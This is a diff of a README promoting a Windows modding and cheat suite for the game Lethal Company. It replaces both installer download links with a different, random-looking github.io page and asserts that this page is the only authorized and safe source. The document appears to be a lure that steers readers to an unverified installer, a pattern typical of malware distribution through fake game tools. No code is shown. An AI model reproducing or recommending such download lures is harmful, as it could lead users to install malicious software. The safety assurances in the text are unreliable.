@@ -2,7 +2,7 @@
 
 Welcome to the Lethal Company Ultimate Modding Suite, the premier Windows desktop tool for enhancing your Lethal Company experience in 2026. This comprehensive modding suite provides a range of features designed to make your gameplay more enjoyable and flexible, allowing you to modify stamina, money, items, and more.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -65,7 +65,7 @@ Yes, the tool includes a configuration menu where you can adjust settings for ea
 
 For the latest version, updates, and additional resources, please visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides the most recent installer and is the only authorized source for downloads, ensuring you get a safe and up-to-date version.
 
